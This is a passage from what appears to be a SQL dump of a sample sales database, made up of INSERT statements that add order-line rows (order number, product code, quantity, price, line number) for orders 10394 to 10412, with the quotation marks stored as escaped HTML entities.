\u0026#39;21\u0026#39;, \u0026#39;83.95\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;135.47\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;124.95\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;53.18\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;35.36\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;104.09\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;47.08\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10394\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;55.93\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10395\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;125.12\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10395\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;205.72\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10395\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;98.39\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10395\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;57.99\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;155.72\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;129.76\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;91.76\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;83.38\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;100.77\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;77.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;77.99\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10396\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;62.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10397\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;69.29\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10397\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;62.88\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10397\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;86.15\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10397\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;80.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10397\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;52.96\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;130.88\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;82.79\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;70.54\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;92.11\u0026#39;, \u0026#39;17\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;100.67\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;60.29\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;61.15\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;56.64\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;65.93\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;60.54\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;38.84\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;78.55\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;75.13\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;98.72\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;102.04\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;76.80\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;62.19\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10398\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;41.22\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;77.52\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;51\u0026#39;, \u0026#39;99.91\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;156.86\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;123.51\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;51.48\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;57\u0026#39;, \u0026#39;104.81\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;75.41\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10399\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;97.89\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;134.64\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;129.31\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;74.84\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;58\u0026#39;, \u0026#39;88.93\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;55.49\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;59.18\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;74.64\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;82.37\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10400\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;41.71\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;75.19\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;87.54\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;59.37\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;52\u0026#39;, \u0026#39;65.93\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;81.91\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;62\u0026#39;, \u0026#39;62.60\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;41.46\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;11\u0026#39;, \u0026#39;77.64\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;85\u0026#39;, \u0026#39;98.72\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;96.11\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;77\u0026#39;, \u0026#39;73.60\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10401\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;66.63\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10402\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;118.94\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10402\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;58.15\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10402\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;61.70\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;85.17\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;174.29\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;122.00\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;55.33\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;109.32\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;57.49\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;35.80\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;88.78\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10403\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;65.09\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;163.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;102.17\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;77\u0026#39;, \u0026#39;67.03\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;90\u0026#39;, \u0026#39;67.54\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;127.88\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;124.99\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;53.27\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10404\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;65.48\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10405\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;97\u0026#39;, \u0026#39;115.16\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10405\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;72.38\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10405\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;55\u0026#39;, \u0026#39;147.33\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10405\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;37.38\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10405\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;127.79\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10406\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;124.56\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10406\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;133.72\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10406\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;117.26\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;114.48\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;141.10\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;58.12\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;132.00\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;91.11\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;66\u0026#39;, \u0026#39;64.14\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;68.35\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;64\u0026#39;, \u0026#39;45.78\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;76\u0026#39;, \u0026#39;81.78\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;59\u0026#39;, \u0026#39;98.65\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;13\u0026#39;, \u0026#39;77.05\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10407\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;101.73\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10408\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;15\u0026#39;, \u0026#39;41.03\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10409\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;6\u0026#39;, \u0026#39;104.25\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10409\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;61\u0026#39;, \u0026#39;27.88\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;65\u0026#39;, \u0026#39;99.66\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;51.21\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;145.13\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;93.21\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;53\u0026#39;, \u0026#39;49.97\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;84.82\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;81.35\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;42.56\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10410\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;95.44\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;205.73\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;144.79\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;110.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;109.67\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;106.55\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;41.25\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;78.01\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;60.76\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10411\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;89.01\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;54\u0026#39;, \u0026#39;100.73\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;150.63\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;56\u0026#39;, \u0026#39;120.28\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;49.83\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;60\u0026#39;, \u0026#39;157.49\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;47.40\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;70\u0026#39;, \u0026#39;109.90\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;32.88\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10412\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;108.82\u0026#39;, \u0026#39;1\u0026#39;); 